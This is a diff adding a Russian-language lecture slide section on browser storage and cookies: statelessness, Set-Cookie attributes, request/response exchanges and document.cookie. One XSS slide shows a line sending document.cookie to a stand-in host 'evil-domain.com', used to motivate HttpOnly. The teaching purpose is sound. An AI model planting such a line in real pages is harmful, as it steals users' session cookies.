@@ -864,6 +864,178 @@
         </pre>
      </div></section>
 
+    <section class="slide shout"><div>
+        <h2>
+            III. Storage
+        </h2>
+     </div></section>
+
+    <section class="slide shout"><div>
+        <h2>
+            HTTP is a stateless protocol
+        </h2>
+     </div></section>
+
+    <section class="slide shout"><div>
+        <h2>
+            Cookies
+        </h2>
+     </div></section>
+
+    <section class="slide"><div>
+        <h2>Cookies</h2>
+        <figure>
+            <blockquote>
+                <p><strong>Куки</strong> — небольшой фрагмент данных, отправленный веб-сервером и хранимый на компьютере пользователя. Веб-клиент (обычно веб-браузер) всякий раз при попытке открыть страницу соответствующего сайта пересылает этот фрагмент данных веб-серверу в виде HTTP-запроса.</p>
+            </blockquote>
+            <figcaption><a href="http://ru.wikipedia.org/wiki/HTTP_cookie">Википедия</a></figcaption>
+        </figure>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>Использование</h2>
+        <pre>
+            <code>АУТЕНТИФИКАЦИЯ</code>
+            <code>ХРАНЕНИЕ НАСТРОЕК ПОЛЬЗОВАТЕЛЕЙ</code>
+            <code>ОТСЛЕЖИВАНИЕ СЕАНСА</code>
+            <code>СБОР СТАТИСТИКИ</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2><a href="http://tools.ietf.org/html/rfc2965">Спецификация</a></h2>
+        <pre>
+            <code>ДО 4096 БАЙТ МИНМУМ</code>
+            <code>МИНИМУМ 20 ШТ. НА ДОМЕН</code>
+            <code>МИНИМУМ 300 ШТ. ВСЕГО</code>
+            <code>ИМЕНЯ НЕЧУВСТВИТЕЛЬНЫ К РЕГИСТРУ</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>1 Клиент → Сервер</h2>
+        <pre>
+            <code>GET / HTTP/1.1</code>
+            <code>Host: example.com</code>
+            <code>…</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>2 Клиент ← Сервер</h2>
+        <pre>
+            <code>HTTP/1.1 200 OK</code>
+            <code><mark>Set-Cookie: name=value</mark></code>
+            <code>Content-Type: text/html</code>
+            <code>…</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>3 Клиент → Сервер</h2>
+        <pre>
+            <code>GET / HTTP/1.1</code>
+            <code>Host: example.com</code>
+            <code><mark>Cookie: name=value</mark></code>
+            <code>…</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>4 Клиент ← Сервер</h2>
+        <pre>
+            <code>HTTP/1.1 200 OK</code>
+            <code><mark>Set-Cookie: name=newValue</mark></code>
+            <code>Content-Type: text/html</code>
+            <code>…</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>Set-Cookie</h2>
+        <pre>
+            <code>Set-Cookie: value[; expires=date][; domain=domain]</code>
+            <code>            [; path=path][; secure][; HttpOnly]</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>Set-Cookie’s expires</h2>
+        <pre>
+            <code>Set-Cookie: value; expires=Sat, 01 March 2014 13:21:34 GMT</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>Set-Cookie’s domain</h2>
+        <pre>
+            <code>Set-Cookie: value1; domain=.mail.ru</code>
+        </pre>
+        <pre>
+            <code>Set-Cookie: value2; domain=e.mail.ru</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>Set-Cookie’s path</h2>
+        <pre>
+            <code>Set-Cookie: value1; path=/</code>
+        </pre>
+        <pre>
+            <code>Set-Cookie: value2; path=/check</code>
+        </pre>
+        <pre>
+            <code>Set-Cookie: value3; path=/checkout</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>Cookie ID</h2>
+        <pre>
+            <code>Set-Cookie: name=value1; domain=.example.com; path=/</code>
+            <code>Set-Cookie: name=value2; domain=www.example.com; path=/</code>
+            <code>Set-Cookie: name=value3; domain=.example.com; path=/archive</code>
+        </pre>
+        <pre>
+            <code>Cookie: name=value1; name=value2; name=value3</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>JavaScript</h2>
+        <pre>
+            <code>document.cookie; <mark class="comment">/* "name=newValue" */</mark></code>
+            <code class="next">document.cookie = "name2=value";</code>
+            <code class="next">document.cookie; <mark class="comment">/* "name=newValue; name2=value" */</mark></code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
+        <pre>
+            <code>(new Image()).src = "http://evil-domain.com/?cookie=" +</code>
+            <code>                    document.cookie;</code>
+        </pre>
+    </div></section>
+
+    <section class="slide"><div>
+        <h2>HttpOnly</h2>
+        <pre>
+            <code>Set-Cookie: name1=value;</code>
+            <code>Set-Cookie: name2=value; HttpOnly</code>
+        </pre>
+        <pre>
+            <code>document.cookie; <mark class="comment">/* "name1=value" */</mark></code>
+        </pre>
+    </div></section>
+
+    <section class="slide shout"><div>
+        <h2>
+            Storage
+        </h2>
+    </div></section>
+    <!-- http://www.html5rocks.com/en/features/storage -->
+
     <div class="progress"><div></div></div>
     <script src="/shower/shower.min.js"></script>
 </body>
